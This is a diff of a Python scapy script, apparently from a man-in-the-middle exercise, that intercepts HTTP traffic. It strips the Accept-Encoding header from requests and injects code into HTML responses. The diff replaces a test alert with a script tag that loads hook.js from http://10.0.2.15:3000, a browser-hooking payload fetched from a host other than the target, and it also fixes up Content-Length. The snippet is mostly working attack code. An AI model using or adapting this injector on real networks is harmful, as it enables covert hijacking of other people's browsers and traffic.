@@ -18,12 +18,12 @@ def process_packet(packet):
         load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)#delete Accept-Encoding field to let the server send response in plain text
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             #print(scapy_packet.show())
-            injection_code = "<script>alert('test');</script>"
+            injection_code = "<script src="http://10.0.2.15:3000/hook.js"></script>"
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)#Content-Length will limit the code injection 
             if content_length_search and "text/html" in load:#just work for Content-Type:text/html and message css javascript have no </body>
